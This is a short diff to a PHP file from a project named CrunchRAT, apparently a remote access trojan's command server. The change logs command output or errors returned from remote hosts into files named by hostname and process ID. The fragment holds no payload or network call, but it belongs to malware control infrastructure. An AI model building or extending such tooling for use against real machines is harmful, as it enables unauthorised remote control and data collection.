@@ -14,7 +14,12 @@
 
     # TO DO: Check if command output or error
 
-    # TO DO: Add in file_put_contents from $post_data array into the <HOSTNAME>/<PID>.log file
-    # Uses FILE_APPEND so it doesn't overwrite previous command output
-    file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", $output, FILE_APPEND);
+    # If output
+    if (isset($output) && !empty($output)) {
+        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived output: \n" . $output, FILE_APPEND);
+    }
+    # Else error
+    else {
+        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived error: \n" . $error, FILE_APPEND);
+    }
 ?>
